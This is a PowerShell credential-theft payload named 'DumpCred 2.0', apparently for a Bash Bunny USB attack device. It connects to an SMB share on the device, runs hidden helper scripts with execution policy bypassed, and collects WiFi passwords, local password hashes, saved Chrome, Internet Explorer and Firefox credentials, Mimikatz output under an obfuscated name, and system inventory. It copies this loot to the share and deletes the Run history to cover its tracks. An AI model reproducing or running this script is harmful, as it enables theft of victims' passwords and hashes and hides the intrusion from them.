
<#
.SYNOPSIS
   DumpCred 2.0
.DESCRIPTION
   Dumps all Creds from a PC 
.PARAMETER <paramName>
   none
.EXAMPLE
   DumpCred
#>

$_Version = "2.0.1"
$_BUILD = "1000"

# Share on bashbunny
$SHARE="\\172.16.64.1\e"
$LOOT="$SHARE\loot"
$FILE="$LOOT\$env:COMPUTERNAME.txt"
$TMPFILE="$env:TEMP\~oou365AF.tmp"
$LINE3="`n`n`n"

# Wait for Share
do { 
    Start-Sleep -s 1
    Write-Host -NoNewline "-"
} until (test-path \\172.16.64.1\e)

# Ok we got the connection.... Wait and Initiate the Handshake
# Handshake - create CON_REQ on Share. Bunny creates CON_OK if all is OK --- Check Share is writable
while ( -Not (Test-Path "$SHARE\CON_OK")) {
    Start-Sleep -s 1
    Write-Host -NoNewline "."
    if ( -Not (( Test-Path "$SHARE\CON_REQ") -or (Test-Path "$SHARE\CON_OK"))) { 
        Write-output " " | out-file "$SHARE\CON_REQ"
        Write-Host -NoNewline "+"
    }
}
Write-Host "!"

# Go on......

# For Outpu we are useing a local TMP File because OUT-File -append to a Fil on Share does not work :-(
# Remove TMP File

Remove-Item $TMPFILE -ErrorAction SilentlyContinue


"###DumpCreds " + $_VERSION + " Build " + $_BUILD | Set-Content $TMPFILE
"=======================================================" | Add-Content $TMPFILE
$LINE3 | Add-Content $TMPFILE

# Dumps WiFi Passwords
Write-Host "WifiCreds"
$WiFiCreds = powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-WiFiCreds.ps1
$WifiCreds | Add-Content $TMPFILE
$LINE3 | Add-Content $TMPFILE


# Dumps all the local Hashes
Write-Host "Hashes"
$PowerDump = powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Invoke-PowerDump.ps1
$Powerdump | Add-Content $TMPFILE
$LINE3 | Add-Content $TMPFILE

# Dumps Chrome Credentials
Write-Host "ChromeCreds"
$ChromeCreds = powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-ChromeCreds.ps1
$ChromeCreds | Add-Content $TMPFILE
$LINE3 | Add-Content $TMPFILE

# Dumps IE Credentials
Write-Host "IECreds" 
$IECreds = powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-IECreds.ps1
$IECreds | Add-Content $TMPFILE
$LINE3 | Add-Content $TMPFILE

# Dumps FireFox Credentials
Write-Host "FFCreds"
$powershellx86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell.exe"
$FoxCreds = & $powershellx86 -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-FoxDump.ps1
$FoxCreds | Add-Content $TMPFILE
$LINE3 | Add-Content $TMPFILE

# M1m1kat3 Output
Write-Host "M1m1k@tz"
$M1m1d0gz = powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Invoke-M1m1d0gz.ps1
$M1m1d0gz | Add-Content $TMPFILE
$LINE3 | Add-Content $TMPFILE

# Get Computer Inventory
write-host "ComputerInventory"
$Inventory = powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-Inventory.ps1
$Inventory | Add-Content $TMPFILE


#Move TMP File to Bunny
move-item $TMPFILE -Destination $FILE -Force -ErrorAction SilentlyContinue

# Cleanup
# Remove Run History
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue

# Rename CON_OK to CON_EOF so bunny knows that all the stuff has finished
Rename-Item -Path "$SHARE\CON_OK" -NewName "$SHARE\CON_EOF"